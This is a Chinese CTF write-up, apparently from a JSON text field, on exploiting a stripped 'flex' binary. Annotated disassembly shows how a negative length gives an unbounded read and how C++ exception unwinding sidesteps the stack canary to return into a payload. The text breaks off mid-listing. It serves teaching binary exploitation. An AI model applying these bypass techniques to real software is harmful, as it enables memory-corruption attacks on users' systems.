            "text": "\u9898\u76ee\u590d\u73b0\n\n\nC++ \u5f02\u5e38\u5904\u7406\u673a\u5236\n\n\n\u9898\u76ee\u89e3\u6790\n\n\n\u53c2\u8003\u8d44\u6599\n\n\n\n\n\u4e0b\u8f7d\u6587\u4ef6\n\n\n\u9898\u76ee\u590d\u73b0\n\n\n$ file flex\nflex: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=30a1acbc98ccf9e8f4b3d1fc06b6ba6f0cbe7c9e, stripped\n$ checksec -f flex\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY  Fortified Fortifiable  FILE\nPartial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   Yes      0               4       flex\n\n\n\u53ef\u4ee5\u770b\u5230\u5f00\u542f\u4e86 Canary\uff0c\u672c\u9898\u7684\u5173\u952e\u5c31\u662f\u5229\u7528\u67d0\u79cd\u795e\u79d8\u673a\u5236\uff08C++\u5f02\u5e38\u5904\u7406\u673a\u5236\uff09\u7ed5\u8fc7\u5b83\u3002\n\n\n\u968f\u4fbf\u73a9\u4e00\u4e0b\uff0c\u4e86\u89e3\u7a0b\u5e8f\u7684\u57fa\u672c\u529f\u80fd\uff1a\n\n$ ./flex\n1.start flexmd5\n2.start flexsha256\n3.start flexsha1\n4.test security\n0 quit\noption:\n1\nFlexMD5 bruteforce tool V0.1\ncustom md5 state (yes/No)\nNo\ncustom charset (yes/No)\nyes\ncharset length:\n10\ncharset:\na\nbruteforce message pattern:\naaaa\n\n\n\u628a\u7a0b\u5e8f\u8dd1\u8d77\u6765\uff1a\n\n$ socat tcp4-listen:10001,reuseaddr,fork exec:./flex \n\n\n\n\nC++ \u5f02\u5e38\u5904\u7406\u673a\u5236\n\n\n$ ldd flex\n        linux-vdso.so.1 (0x00007ffcd837a000)\n        libstdc++.so.6 =\n /usr/lib/libstdc++.so.6 (0x00007f748fe72000)\n        libgcc_s.so.1 =\n /usr/lib/libgcc_s.so.1 (0x00007f748fc5b000)\n        libc.so.6 =\n /usr/lib/libc.so.6 (0x00007f748f8a3000)\n        libm.so.6 =\n /usr/lib/libm.so.6 (0x00007f748f557000)\n        /lib64/ld-linux-x86-64.so.2 =\n /usr/lib64/ld-linux-x86-64.so.2 (0x00007f74901f9000)\n\n\n\u6240\u4ee5\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u4e00\u4e2a C \u548c C++ \u6df7\u5408\u7f16\u8bd1\u7684\uff0c\u4ee5\u4fbf\u5904\u7406\u5f02\u5e38\u3002\n\n\n\u5f53\u7528\u6237 throw \u4e00\u4e2a\u5f02\u5e38\u65f6\uff0c\u7f16\u8bd1\u5668\u4f1a\u5e2e\u6211\u4eec\u8c03\u7528\u76f8\u5e94\u7684\u51fd\u6570\u5206\u914d \n_cxa_exception\n \u5c31\u662f\u5934\u90e8\uff0c\nexception_obj\n\u3002\u5f02\u5e38\u5bf9\u8c61\u7531\u51fd\u6570 \n__cxa_allocate_exception()\n \u8fdb\u884c\u521b\u5efa\uff0c\u6700\u540e\u7531 \n__cxa_free_exception()\n \u8fdb\u884c\u9500\u6bc1\u3002\u5f53\u6211\u4eec\u5728\u7a0b\u5e8f\u91cc\u6267\u884c\u4e86\u629b\u51fa\u5f02\u5e38\u540e\uff0c\u7f16\u8bd1\u5668\u505a\u4e86\u5982\u4e0b\u7684\u4e8b\u60c5\uff1a\n1. \u8c03\u7528 \n__cxa_allocate_exception\n \u51fd\u6570\uff0c\u5206\u914d\u4e00\u4e2a\u5f02\u5e38\u5bf9\u8c61\n2. \u8c03\u7528 \n__cxa_throw\n \u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u4f1a\u5c06\u5f02\u5e38\u5bf9\u8c61\u505a\u4e00\u4e9b\u521d\u59cb\u5316\n3. \n__cxa_throw()\n \u8c03\u7528 Itanium ABI \u91cc\u7684 \n_Unwind_RaiseException()\n \u4ece\u800c\u5f00\u59cb unwind\uff0cunwind \u5206\u4e3a\u4e24\u4e2a\u9636\u6bb5\uff0c\u5206\u522b\u8fdb\u884c\u641c\u7d22 catch \u53ca\u6e05\u7406\u8c03\u7528\u6808\n4. \n_Unwind_RaiseException()\n \u5bf9\u8c03\u7528\u94fe\u4e0a\u7684\u51fd\u6570\u8fdb\u884c unwind \u65f6\uff0c\u8c03\u7528 personality routine\uff08\n__gxx_personality_v0\n\uff09\n5. \u5982\u679c\u8be5\u5f02\u5e38\u5982\u80fd\u88ab\u5904\u7406\uff08\u6709\u76f8\u5e94\u7684 catch\uff09\uff0c\u5219 personality routine \u4f1a\u4f9d\u6b21\u5bf9\u8c03\u7528\u94fe\u4e0a\u7684\u51fd\u6570\u8fdb\u884c\u6e05\u7406\u3002\n6. \n_Unwind_RaiseException()\n \u5c06\u63a7\u5236\u6743\u8f6c\u5230\u76f8\u5e94\u7684 catch \u4ee3\u7801\n7. unwind \u5b8c\u6210\uff0c\u7528\u6237\u4ee3\u7801\u7ee7\u7eed\u6267\u884c\n\n\n\u5177\u4f53\u5185\u5bb9\u67e5\u770b\u53c2\u8003\u8d44\u6599\u3002\n\n\n\u9898\u76ee\u89e3\u6790\n\n\n\u7a0b\u5e8f\u7684\u7b2c\u56db\u4e2a\u9009\u9879\u5f88\u5438\u5f15\u4eba\uff0c\u4f46\u4f3c\u4e4e\u6ca1\u6709\u53d1\u73b0\u4ec0\u4e48\u7a81\u7834\u70b9\uff0c\u800c\u7b2c\u4e00\u4e2a\u9009\u9879\u53ef\u4ee5\u8f93\u5165\u7684\u4e1c\u897f\u8f83\u591a\uff0c\u95ee\u9898\u5e94\u8be5\u5728\u8fd9\u91cc\uff0c\u67e5\u770b\u8be5\u51fd\u6570 \nsub.bruteforcing_start:_500\n\uff1a\n\n[0x00400d80]\n pdf @ sub.bruteforcing_start:_500\n/ (fcn) sub.bruteforcing_start:_500 63\n|   sub.bruteforcing_start:_500 ();\n|              ; CALL XREF from 0x00402200 (main)\n|           0x00401500      55             push rbp\n|           0x00401501      4889e5         mov rbp, rsp\n|           0x00401504      4883ec10       sub rsp, 0x10\n|           0x00401508      e83bfcffff     call sub.FlexMD5_bruteforce_tool_V0.1_148\n|           0x0040150d      e87dfaffff     call fcn.00400f8f\n|           0x00401512      bf4f464000     mov edi, str.bruteforcing_start: ; 0x40464f ; \nbruteforcing start:\n\n|           0x00401517      e8b4f6ffff     call sym.imp.puts           ; int puts(const char *s)\n|              ; JMP XREF from 0x00401534 (sub.bruteforcing_start:_500)\n|       .-\n 0x0040151c      e88cfeffff     call sub.strlen_3ad         ; size_t strlen(const char *s)\n|       :   0x00401521      85c0           test eax, eax\n|       :   0x00401523      0f94c0         sete al\n|       :   0x00401526      84c0           test al, al\n|      ,==\n 0x00401528      740c           je 0x401536\n|      |:   0x0040152a      bf01000000     mov edi, 1\n|      |:   0x0040152f      e83cf7ffff     call sym.imp.sleep          ; int sleep(int s)\n|      |`=\n 0x00401534      ebe6           jmp 0x40151c\n|      |       ; JMP XREF from 0x00401528 (sub.bruteforcing_start:_500)\n|      |       ; JMP XREF from 0x0040155d (sub.bruteforcing_start:_500 + 93)\n|      `.-\n 0x00401536      b800000000     mov eax, 0                   ; \u5f02\u5e38\u5904\u7406\u4ee3\u7801\n|      ,==\n 0x0040153b      eb22           jmp 0x40155f\n       |:   0x0040153d      4883fa01       cmp rdx, 1                  ; 1 ; \u5982\u679c\u6210\u529f\u6355\u83b7\u5f02\u5e38\uff0c\u5219\u8df3\u8f6c\u5230\u8fd9\u91cc\n      ,===\n 0x00401541      7408           je 0x40154b                  ; \u8df3\u8f6c\n      ||:   0x00401543      4889c7         mov rdi, rax\n      ||:   0x00401546      e8f5f7ffff     call sym.imp._Unwind_Resume\n      ||:      ; JMP XREF from 0x00401541 (sub.bruteforcing_start:_500 + 65)\n      `---\n 0x0040154b      4889c7         mov rdi, rax\n       |:   0x0040154e      e8bdf7ffff     call sym.imp.__cxa_begin_catch\n       |:   0x00401553      8b00           mov eax, dword [rax]\n       |:   0x00401555      8945fc         mov dword [rbp - 4], eax\n       |:   0x00401558      e8a3f7ffff     call sym.imp.__cxa_end_catch\n       |`=\n 0x0040155d      ebd7           jmp 0x401536                ; sub.bruteforcing_start:_500+0x36\n|      |       ; JMP XREF from 0x0040153b (sub.bruteforcing_start:_500)\n|      `--\n 0x0040155f      c9             leave\n\\           0x00401560      c3             ret                          ; ret \u5230 payload_2\n\n\n\u51fd\u6570 \nsub.FlexMD5_bruteforce_tool_V0.1_148\n\uff1a\n\n[0x00400d80]\n pdf @ sub.FlexMD5_bruteforce_tool_V0.1_148\n/ (fcn) sub.FlexMD5_bruteforce_tool_V0.1_148 613\n|   sub.FlexMD5_bruteforce_tool_V0.1_148 ();\n|           ; var int local_124h @ rbp-0x124\n|           ; var int local_120h @ rbp-0x120\n|           ; var int local_18h @ rbp-0x18\n|              ; CALL XREF from 0x00401508 (sub.bruteforcing_start:_500)\n|           0x00401148      55             push rbp\n|           0x00401149      4889e5         mov rbp, rsp\n|           0x0040114c      53             push rbx\n|           0x0040114d      4881ec280100.  sub rsp, 0x128\n|           0x00401154      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=-1 ; \n(\n ; 40\n|           0x0040115d      488945e8       mov qword [local_18h], rax\n|           0x00401161      31c0           xor eax, eax\n|           0x00401163      bf47454000     mov edi, str.FlexMD5_bruteforce_tool_V0.1 ; 0x404547 ; \nFlexMD5 bruteforce tool V0.1\n\n|           0x00401168      e863faffff     call sym.imp.puts           ; int puts(const char *s)\n|           0x0040116d      bf64454000     mov edi, str.custom_md5_state__yes_No_ ; 0x404564 ; \ncustom md5 state (yes/No)\n                                                            \n|           0x00401172      e859faffff     call sym.imp.puts           ; int puts(const char *s)\n|           0x00401177      488d85e0feff.  lea rax, [local_120h]\n|           0x0040117e      be04000000     mov esi, 4\n|           0x00401183      4889c7         mov rdi, rax\n|           0x00401186      e8ebfcffff     call sub.read_e76           ; ssize_t read(int fildes, void *buf, size_t nbyte)\n|           0x0040118b      488d85e0feff.  lea rax, [local_120h]\n|           0x00401192      ba03000000     mov edx, 3\n|           0x00401197      be7e454000     mov esi, 0x40457e           ; \nyes\n\n|           0x0040119c      4889c7         mov rdi, rax\n|           0x0040119f      e85cfaffff     call sym.imp.strncmp        ; int strncmp(const char *s1, const char *s2, size_t n)\n|           0x004011a4      85c0           test eax, eax\n|       ,=\n 0x004011a6      755e           jne 0x401206\n|       |   0x004011a8      c705f24f2000.  mov dword [0x006061a4], 1   ; [0x6061a4:4]=0\n|       |   0x004011b2      bf82454000     mov edi, str.initial_state_0_: ; 0x404582 ; \ninitial state[0]:\n\n|       |   0x004011b7      e814faffff     call sym.imp.puts           ; int puts(const char *s)\n|       |   0x004011bc      e884fdffff     call sub.atoi_f45           ; int atoi(const char *str)\n|       |   0x004011c1      8905e94f2000   mov dword [0x006061b0], eax ; [0x6061b0:4]=0\n|       |   0x004011c7      bf94454000     mov edi, str.initial_state_1_: ; 0x404594 ; \ninitial state[1]:\n\n|       |   0x004011cc      e8fff9ffff     call sym.imp.puts           ; int puts(const char *s)\n|       |   0x004011d1      e86ffdffff     call sub.atoi_f45           ; int atoi(const char *str)\n|       |   0x004011d6      8905d84f2000   mov dword [0x006061b4], eax ; [0x6061b4:4]=0\n|       |   0x004011dc      bfa6454000     mov edi, str.initial_state_2_: ; 0x4045a6 ; \ninitial state[2]:\n\n|       |   0x004011e1      e8eaf9ffff     call sym.imp.puts           ; int puts(const char *s)\n|       |   0x004011e6      e85afdffff     call sub.atoi_f45           ; int atoi(const char *str)\n|       |   0x004011eb      8905c74f2000   mov dword [0x006061b8], eax ; [0x6061b8:4]=0\n|       |   0x004011f1      bfb8454000     mov edi, str.initial_state_3_: ; 0x4045b8 ; \ninitial state[3]:\n\n|       |   0x004011f6      e8d5f9ffff     call sym.imp.puts           ; int puts(const char *s)\n|       |   0x004011fb      e845fdffff     call sub.atoi_f45           ; int atoi(const char *str)\n|       |   0x00401200      8905b64f2000   mov dword [0x006061bc], eax ; [0x6061bc:4]=0\n|       |      ; JMP XREF from 0x004011a6 (sub.FlexMD5_bruteforce_tool_V0.1_148)\n|       `-\n 0x00401206      bfca454000     mov edi, str.custom_charset__yes_No_ ; 0x4045ca ; \ncustom charset (yes/No)\n\n|           0x0040120b      e8c0f9ffff     call sym.imp.puts           ; int puts(const char *s)\n|           0x00401210      488d85e0feff.  lea rax, [local_120h]\n|           0x00401217      be04000000     mov esi, 4\n|           0x0040121c      4889c7         mov rdi, rax\n|           0x0040121f      e852fcffff     call sub.read_e76           ; ssize_t read(int fildes, void *buf, size_t nbyte)\n|           0x00401224      488d85e0feff.  lea rax, [local_120h]\n|           0x0040122b      ba03000000     mov edx, 3\n|           0x00401230      be7e454000     mov esi, 0x40457e           ; \nyes\n\n|           0x00401235      4889c7         mov rdi, rax\n|           0x00401238      e8c3f9ffff     call sym.imp.strncmp        ; int strncmp(const char *s1, const char *s2, size_t n)\n|           0x0040123d      85c0           test eax, eax\n|       ,=\n 0x0040123f      0f858a000000   jne 0x4012cf\n|       |   0x00401245      c705554f2000.  mov dword [0x006061a4], 1   ; [0x6061a4:4]=0\n|       |   0x0040124f      bfe2454000     mov edi, str.charset_length: ; 0x4045e2 ; \ncharset length:\n\n|       |   0x00401254      e877f9ffff     call sym.imp.puts           ; int puts(const char *s)\n|       |   0x00401259      e8e7fcffff     call sub.atoi_f45           ; int atoi(const char *str) ; \u8bfb\u5165\u5b57\u7b26\u4e32\u5e76\u8f6c\u6362\u6210\u6574\u578b\u6570\n|       |   0x0040125e      8905ac4e2000   mov dword [0x00606110], eax ; [0x606110:4]=62\n|       |   0x00401264      8b05a64e2000   mov eax, dword [0x00606110] ; [0x606110:4]=62\n|       |   0x0040126a      3d00010000     cmp eax, 0x100              ; 256 ; \u6bd4\u8f83\u5927\u5c0f\n|      ,==\n 0x0040126f      7e22           jle 0x401293                 ; eax \n 256 \u65f6\u8df3\u8f6c ; \u8fd9\u91cc\u6211\u4eec\u8f93\u5165\u4e00\u4e2a\u8d1f\u6570\u5373\u53ef\u6210\u529f\u8df3\u8f6c\n|      ||   0x00401271      bf04000000     mov edi, 4\n|      ||   0x00401276      e855faffff     call sym.imp.__cxa_allocate_exception\n|      ||   0x0040127b      c70002000000   mov dword [rax], 2\n|      ||   0x00401281      ba00000000     mov edx, 0\n|      ||   0x00401286      be70616000     mov esi, obj.typeinfoforint ; 0x606170\n|      ||   0x0040128b      4889c7         mov rdi, rax\n|      ||   0x0040128e      e85dfaffff     call sym.imp.__cxa_throw\n|      ||      ; JMP XREF from 0x0040126f (sub.FlexMD5_bruteforce_tool_V0.1_148)\n|      `--\n 0x00401293      bff2454000     mov edi, str.charset:       ; 0x4045f2 ; \ncharset:\n\n|       |   0x00401298      e833f9ffff     call sym.imp.puts           ; int puts(const char *s)\n|       |   0x0040129d      8b056d4e2000   mov eax, dword [0x00606110] ; [0x606110:4]=62 ; \u53d6\u51fa\u6570\u5b57\n|       |   0x004012a3      83c001         add eax, 1                   ; eax += 1\n|       |   0x004012a6      89c2           mov edx, eax\n|       |   0x004012a8      488d85e0feff.  lea rax, [local_120h]\n|       |   0x004012af      89d6           mov esi, edx\n|       |   0x004012b1      4889c7         mov rdi, rax\n|       |   0x004012b4      e8bdfbffff     call sub.read_e76           ; ssize_t read(int fildes, void *buf, size_t nbyte) ; \u8be5\u51fd\u6570\u5185\u8c03\u7528 read(0, [local_120h], esi) \u8bfb\u5165\u6211\u4eec\u7684 payload_1\uff0c\u7531\u4e8eesi\u662f\u4e00\u4e2a\u8d1f\u6570\uff0c\u800c 0x00400ea8 jae 0x400ef3 \u5904\u662f\u4e0e\u4e00\u4e2a\u975e\u8d1f\u6570\u6bd4\u8f83\uff0c\u6c38\u8fdc\u4e0d\u4f1a\u76f8\u7b49\uff0c\u5373\u53ef\u4ee5\u8bfb\u5165\u4ee5\u6362\u884c\u7b26\u7ed3\u5c3e\u7684\u4efb\u610f\u6570\u91cf\u5b57\u7b26\n|       |   0x004012b9      488d85e0feff.  lea rax, [local_120h]\n|       |   0x004012c0      4889c7         mov rdi, rax\n|       |   0x004012c3      e8e8f9ffff     call sym.imp.strdup         ; char *strdup(const char *src) ; \u5728\u5806\u4e2d\u590d\u5236\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u526f\u672c\n|       |   0x004012c8      488905494e20.  mov qword str.ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789, rax ; [0x606118:8]=0x404508 str.ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\n|       |      ; JMP XREF from 0x0040123f (sub.FlexMD5_bruteforce_tool_V0.1_148)\n|       `-\n 0x004012cf      bffb454000     mov edi, str.bruteforce_message_pattern: ; 0x4045fb ; \nbruteforce message pattern:\n\n|           0x004012d4      e8f7f8ffff     call sym.imp.puts           ; int puts(const char *s)\n|           0x004012d9      be00040000     mov esi, 0x400              ; 1024\n|           0x004012de      bfc0616000     mov edi, 0x6061c0\n|           0x004012e3      e836fcffff     call sub.read_f1e           ; ssize_t read(int fildes, void *buf, size_t nbyte) ; \u8c03\u7528 read(0, 0x6061c0, 0x400) \u8bfb\u5165 payload_2\n|           0x004012e8      bfc0616000     mov edi, 0x6061c0\n|           0x004012ed      e85ef9ffff     call sym.imp.strlen         ; size_t strlen(const char *s)\n|           0x004012f2      8905a84e2000   mov dword [0x006061a0], eax ; [0x6061a0:4]=0\n|           0x004012f8      c785dcfeffff.  mov dword [local_124h], 0\n|              ; JMP XREF from 0x00401334 (sub.FlexMD5_bruteforce_tool_V0.1_148)\n|       .-\n 0x00401302      8b85dcfeffff   mov eax, dword [local_124h]\n|       :   0x00401308      4863d8         movsxd rbx, eax              ; \u5c06 rbx \u521d\u59cb\u5316\u4e3a 0\n|       :   0x0040130b      bfc0616000     mov edi, 0x6061c0            ; paylaod_2 \u7684\u5730\u5740\n|       :   0x00401310      e83bf9ffff     call sym.imp.strlen         ; size_t strlen(const char *s)\n|       :   0x00401315      4839c3         cmp rbx, rax                 ; \u6bd4\u8f83 rbx \u548c rax\uff0crax \u662f\u5b57\u7b26\u4e32\u957f\u5ea6\u8fd4\u56de\u503c\n|      ,==\n 0x00401318      731d           jae 0x401337                 ; \u76f8\u7b49\u65f6\u8df3\u8f6c\n|      |:   0x0040131a      8b85dcfeffff   mov eax, dword [local_124h]\n|      |:   0x00401320      4898           cdqe\n|      |:   0x00401322      0fb680c06160.  movzx eax, byte [rax + 0x6061c0] ; [0x6061c0:1]=0\n|      |:   0x00401329      3c2e           cmp al, 0x2e                ; \n.\n ; 46\n|     ,===\n 0x0040132b      7409           je 0x401336\n|     ||:   0x0040132d      8385dcfeffff.  add dword [local_124h], 1    ; rbx += 1\n|     ||`=\n 0x00401334      ebcc           jmp 0x401302\n|     ||       ; JMP XREF from 0x0040132b (sub.FlexMD5_bruteforce_tool_V0.1_148)\n|     `---\n 0x00401336      90             nop\n|      |       ; JMP XREF from 0x00401318 (sub.FlexMD5_bruteforce_tool_V0.1_148)\n|      `--\n 0x00401337      8b85dcfeffff   mov eax, dword [local_124h]\n|           0x0040133d      4863d8         movsxd rbx, eax\n|           0x00401340      bfc0616000     mov edi, 0x6061c0\n|           0x00401345      e806f9ffff     call sym.imp.strlen         ; size_t strlen(const char *s)\n|           0x0040134a      4839c3         cmp rbx, rax                 ; \u6bd4\u8f83 rbx \u548c rax\n|       ,=\n 0x0040134d      7522           jne 0x401371                 ; \u5982\u679c\u76f8\u7b49\uff0c\u5219\u8fdb\u5165\u5f02\u5e38\u5904\u7406\u673a\u5236\uff0c\u5229\u7528\u8be5\u673a\u5236\u53ef leave;ret \u5230 payload_2\n|       |   0x0040134f      bf04000000     mov edi, 4                               ; \u53c2\u6570 edi = 4\n|       |   0x00401354      e877f9ffff     call sym.imp.__cxa_allocate_exception    ; \u521b\u5efa\u5f02\u5e38\u5bf9\u8c61\uff0c\u8fd4\u56de\u5bf9\u8c61\u5730\u5740 rax\n|       |   0x00401359      c70000000000   mov dword [rax], 0                       ; \u521d\u59cb\u5316\u4e3a 0\n|       |   0x0040135f      ba00000000     mov edx, 0                               ; \u53c2\u6570 edx = 0\n|       |   0x00401364      be70616000     mov esi, obj.typeinfoforint ; 0x606170   ; \u53c2\u6570 esi = 0x606170\n|       |   0x00401369      4889c7         mov rdi, rax                             ; \u53c2\u6570 rdi = rax\n|       |   0x0040136c      e87ff9ffff     call sym.imp.__cxa_throw     ; \u5bf9\u5f02\u5e38\u5bf9\u8c61\u505a\u4e00\u4e9b\u521d\u59cb\u5316\uff0c\u8fd9\u91cc\u4f1a\u8df3\u8f6c\u5230 0x0040153d\n|       |      ; JMP XREF from 0x0040134d (sub.FlexMD5_bruteforce_tool_V0.1_148)\n|       `-\n 0x00401371      bf17464000     mov edi, str.md5_pattern:   ; 0x404617 ; \nmd5 pattern:\n\n|           0x00401376      e855f8ffff     call sym.imp.puts           ; int puts(const char *s)\n|           0x0040137b      be21000000     mov esi, 0x21               ; \n!\n ; 33\n|           0x00401380      bfc0656000     mov edi, 0x6065c0\n|           0x00401385      e8ecfaffff     call sub.read_e76           ; ssize_t read(int fildes, void *buf, size_t nbyte)\n|           0x0040138a      b800000000     mov eax, 0\n|           0x0040138f      488b4de8       mov rcx, qword [local_18h]\n|           0x00401393      6448330c2528.  xor rcx, qword fs:[0x28]\n|       ,=\n 0x0040139c      7405           je 0x4013a3\n|       |   0x0040139e      e81df9ffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)\n|       |      ; JMP XREF from 0x0040139c (sub.FlexMD5_bruteforce_tool_V0.1_148)\n|       `-\n 0x004013a3      4881c4280100.  add rsp, 0x128\n|           0x004013aa      5b             pop rbx\n|           0x004013ab      5d             pop rbp\n\\           0x004013ac      c3             ret\n\n\n\u51fd\u6570 \nsub.atoi_f45\n \u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u6210\u957f\u6574\u578b\u6570\uff1a\n\n[0x00400d80]\n pdf @ sub.atoi_f45\n/ (fcn) sub.atoi_f45 74\n|   sub.atoi_f45 ();\n|           ; var int local_20h @ rbp-0x20\n|           ; var int local_8h @ rbp-0x8\n|              ; XREFS: CALL 0x004021f2  CALL 0x004011bc  CALL 0x004011d1  CALL 0x004011e6  CALL 0x004011fb  CALL 0x00401259  CALL 0x004015d9  CALL 0x00402136  \n|           0x00400f45      55             push rbp\n|           0x00400f46      4889e5         mov rbp, rsp\n|           0x00400f49      4883ec20       sub rsp, 0x20\n|           0x00400f4d      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=-1 ; \n(\n ; 40\n|           0x00400f56      488945f8       mov qword [local_8h], rax\n|           0x00400f5a      31c0           xor eax, eax\n|           0x00400f5c      488d45e0       lea rax, [local_20h]\n|           0x00400f60      be0b000000     mov esi, 0xb                ; 11\n|           0x00400f65      4889c7         mov rdi, rax\n|           0x00400f68      e809ffffff     call sub.read_e76           ; ssize_t read(int fildes, void *buf, size_t nbyte)\n|           0x00400f6d      488d45e0       lea rax, [local_20h]         ; local_20h \u6307\u5411\u8bfb\u5165\u7684\u5b57\u7b26\u4e32\n|           0x00400f71      4889c7         mov rdi, rax                 ; rdi = rax\n|           0x00400f74      e807fdffff     call sym.imp.atoi           ; int atoi(const char *str) ; \u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u6210\u957f\u6574\u578b\n|           0x00400f79      488b55f8       mov rdx, qword [local_8h]\n|           0x00400f7d      644833142528.  xor rdx, qword fs:[0x28]\n|       ,=\n 0x00400f86      7405           je 0x400f8d\n|       |   0x00400f88      e833fdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)\n|       |      ; JMP XREF from 0x00400f86 (sub.atoi_f45)\n|       `-\n 0x00400f8d      c9             leave\n\\           0x00400f8e      c3             ret\n\n\n\u53ef\u4ee5\u770b\u5230\u8be5\u51fd\u6570\u5e76\u672a\u5bf9\u6240\u8f93\u5165\u7684\u6570\u5b57\u8fdb\u884c\u9a8c\u8bc1\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u8f93\u5165\u8d1f\u6570\uff0c\u56e0\u4e3a\u8ba1\u7b97\u673a\u4e2d\u6570\u5b57\u662f\u4ee5\u8865\u7801\u7684\u5f62\u5f0f\u5b58\u5728\uff0c\u4f8b\u5982 \n-2 = 0xfffffffffffffffe\n\u3002\u8fd9\u4e2a\u6570\u5b57\u52a0 1 \u540e\uff0c\u4f5c\u4e3a\u8bfb\u5165\u5b57\u7b26\u4e32\u4e2a\u6570\u7684\u5224\u5b9a\uff0c\u56e0\u4e3a\u4e2a\u6570\u4e0d\u80fd\u4e3a\u8d1f\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f00\u5fc3\u5730\u8bfb\u5165\u540e\u9762\u7684 payload \u4e86\u3002\n\n\n\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\u8bfb\u5165\u64cd\u4f5c\u4f7f\u7528\u51fd\u6570 \nsub.read_e76\n\uff0c\u8be5\u51fd\u6570\u5185\u90e8\u6709\u4e00\u4e2a\u5faa\u73af\uff0c\u6bcf\u6b21\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\uff0c\u5982\u679c\u9047\u5230\u6362\u884c\u7b26\uff0c\u5219\u5b8c\u6210\u9000\u51fa\u3002\n\n[0x00400d80]\n pdf @ sub.read_e76\n/ (fcn) sub.read_e76 168\n|   sub.read_e76 ();\n|           ; var int local_1ch @ rbp-0x1c\n|           ; var int local_18h @ rbp-0x18\n|           ; var int local_dh @ rbp-0xd\n|           ; var int local_ch @ rbp-0xc\n|           ; var int local_8h @ rbp-0x8\n|              ; XREFS: CALL 0x00400f68  CALL 0x00401186  CALL 0x0040121f  CALL 0x004012b4  CALL 0x00401385  CALL 0x0040159f  CALL 0x00401634  CALL 0x00401663  \n|              ; XREFS: CALL 0x00401705  CALL 0x00401d4f  \n|           0x00400e76      55             push rbp\n|           0x00400e77      4889e5         mov rbp, rsp\n|           0x00400e7a      4883ec20       sub rsp, 0x20\n|           0x00400e7e      48897de8       mov qword [local_18h], rdi\n|           0x00400e82      8975e4         mov dword [local_1ch], esi\n|           0x00400e85      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=-1 ; \n(\n ; 40\n|           0x00400e8e      488945f8       mov qword [local_8h], rax\n|           0x00400e92      31c0           xor eax, eax\n|           0x00400e94      c745f4000000.  mov dword [local_ch], 0\n|           0x00400e9b      c745f4000000.  mov dword [local_ch], 0\n|              ; JMP XREF from 0x00400ef1 (sub.read_e76)\n|       .-\n 0x00400ea2      8b45f4         mov eax, dword [local_ch]    ; \u5faa\u73af\u8d77\u70b9\uff0clocal_ch \u5b58\u653e\u5df2\u8f93\u5165\u5b57\u7b26\u6570\u91cf\n|       :   0x00400ea5      3b45e4         cmp eax, dword [local_1ch]   ; \u5141\u8bb8\u8bfb\u5165\u7684\u6570\u91cf\n|      ,==\n 0x00400ea8      7349           jae 0x400ef3                 ; \u76f8\u7b49\u65f6\u8df3\u8f6c\u3000\uff08\u5f53\u8bfb\u5165payload_!\u65f6\uff0c\u7531\u4e8e\u6211\u4eec\u8f93\u5165\u7684\u662f\u4e00\u4e2a\u8d1f\u6570\uff0c\u800c eax \u662f\u975e\u8d1f\u6570\uff0c\u6c38\u8fdc\u4e0d\u4f1a\u76f8\u7b49\uff09\n|      |:   0x00400eaa      488d45f3       lea rax, [local_dh]\n|      |:   0x00400eae      ba01000000     mov edx, 1                   ; nbyte = 1\n|      |:   0x00400eb3      4889c6         mov rsi, rax                 ; buf = rsi = [local_dh]\n|      |:   0x00400eb6      bf00000000     mov edi, 0                   ; fildes = edi = 0\n|      |:   0x00400ebb      e830fdffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte) ; \u6bcf\u6b21\u8bfb\u5165 1 \u4e2a\u5b57\u7b26\n|      |:   0x00400ec0      0fb645f3       movzx eax, byte [local_dh]   ; \u53d6\u51fa\u8f93\u5165\u5b57\u7b26\n|      |:   0x00400ec4      3c0a           cmp al, 0xa                 ; 10 ; \u6bd4\u8f83\u8f93\u5165\u5b57\u7b26\u662f\u4e0d\u662f \n\\n\n\n|     ,===\n 0x00400ec6      7515           jne 0x400edd                 ; \u4e0d\u662f\u5219\u8df3\u8f6c\n|     ||:   0x00400ec8      8b55f4         mov edx, dword [local_ch]\n|     ||:   0x00400ecb      488b45e8       mov rax, qword [local_18h]\n|     ||:   0x00400ecf      4801d0         add rax, rdx                ; \n(\n\n|     ||:   0x00400ed2      c60000         mov byte [rax], 0\n|     ||:   0x00400ed5      8b45f4         mov eax, dword [local_ch]\n|     ||:   0x00400ed8      83c001         add eax, 1\n|    ,====\n 0x00400edb      eb2b           jmp 0x400f08\n|    |||:      ; JMP XREF from 0x00400ec6 (sub.read_e76)\n|    |`---\n 0x00400edd      8b55f4         mov edx, dword [local_ch]    ; \u53d6\u51fa\u5b57\u7b26\u6570\u91cf\n|    | |:   0x00400ee0      488b45e8       mov rax, qword [local_18h]   ; local_18h \u4e3a\u76ee\u6807\u521d\u59cb\u5730\u5740\n|    | |:   0x00400ee4      4801c2         add rdx, rax                ; \n#\n ; rdx \u6307\u5411\u76ee\u6807\u5730\u5740\n|    | |:   0x00400ee7      0fb645f3       movzx eax, byte [local_dh]   ; \u53d6\u51fa\u8bfb\u5165\u5b57\u7b26\n|    | |:   0x00400eeb      8802           mov byte [rdx], al           ; \u5c06\u8bfb\u5165\u5b57\u7b26\u5b58\u653e\u5230 [rdx]\n|    | |:   0x00400eed      